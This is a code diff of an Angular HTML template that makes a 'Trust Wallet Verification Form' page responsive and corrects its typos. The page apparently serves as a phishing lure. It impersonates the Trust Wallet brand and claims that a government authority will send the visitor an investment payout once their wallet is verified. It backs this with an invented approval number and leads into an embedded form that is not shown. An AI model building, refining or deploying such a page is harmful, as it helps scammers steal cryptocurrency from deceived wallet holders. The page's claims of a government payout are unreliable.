@@ -1,24 +1,39 @@
+<app-header></app-header>
 <div>
-    <div class="bg-blue-500  p-5  h-96 py-6 flex w-full">
-        <div class="w-1/2 content-center">
-           <h3 class="text-white font-bold text-4xl animate-slide-in-left">Trust Wallet Verification Form </h3>
-           <p class="text-white py-3 text-lg">For the purpose of receiving an investment amount from an official institution.</p>
-           <button type="button" class="rounded-md bg-white text-blue-500 p-2 px-4 ">Get Started</button>
+    <div class="bg-blue-500 p-5 h-auto md:h-96 py-6 flex flex-col md:flex-row w-full items-center">
+        <!-- Left Section (Text) -->
+        <div class="md:w-1/2 text-center md:text-left content-center p-4">
+            <h3 class="text-white font-bold text-3xl md:text-4xl animate-slide-in-left">
+                Trust Wallet Verification Form
+            </h3>
+            <p class="text-white py-3 text-base md:text-lg">
+                For the purpose of receiving an investment amount from an official institution.
+            </p>
+            <button type="button" class="rounded-md bg-white text-blue-500 p-2 px-4 mt-2">
+               <a href="#form"> Get Started</a>
+            </button>
         </div>
-        <div class="w-1/2 flex justify-center items-center  animate-slide-in-right ">
-            <div class="bg-white text-blue-400 w-2/5 h-56 rounded-l-md text-center text-2xl font-bold content-center">
+    
+        <div class="md:w-1/2 flex flex-col md:flex-row justify-center items-center animate-slide-in-right ">
+            <div class="bg-white text-blue-400 w-4/5 md:w-2/5 h-40 md:h-56 rounded-md text-center text-2xl font-bold flex items-center justify-center">
                 <h1>Trust Wallet</h1>
             </div>
-            <div class="bg-blue-700 text-white w-2/5 h-56 rounded-r-md text-center content-center text-2xl font-bold">
+            <div class="bg-blue-700 text-white w-4/5 md:w-2/5 h-40 md:h-56 rounded-md text-center text-2xl font-bold flex items-center justify-center">
                 <h1>Trust</h1>
             </div>
         </div>
     </div>
-    <div class="text-center p-24">
-           <h1 class="p-3 font-extrabold text-3xl">Trust Wallet</h1>
-           <p class="py-3 text-gray-600">Wallet verification form for the purpose of receiving an investment amount from an official institution.        </p>
-           <p class="text-gray-600">This form is sudmiffed for the purpose of verifying an c/ccfronic wallet registered under an individual’s name at the request of a government authority or Institution to facilitate tho transfer of a financial amount from government ontltios to the wallet holder</p>
-           <p class="text-green-600">APPROVAL NO.1405-0189</p>
+    
+    <!-- Text Section -->
+    <div class="text-center p-12 md:p-24 text-base md:text-lg" id="trust-wallet-section">
+        <h1 class="p-3 font-extrabold text-2xl md:text-3xl">Trust Wallet</h1>
+        <p class="py-3 text-gray-600">
+            Wallet verification form for the purpose of receiving an investment amount from an official institution.
+        </p>
+        <p class="text-gray-600">
+            This form is submitted for the purpose of verifying an electronic wallet registered under an individual’s name at the request of a government authority or institution to facilitate the transfer of a financial amount from government entities to the wallet holder.
+        </p>
+        <p class="text-green-600">APPROVAL NO.1405-0189</p>
     </div>
     <app-form></app-form>
 </div>
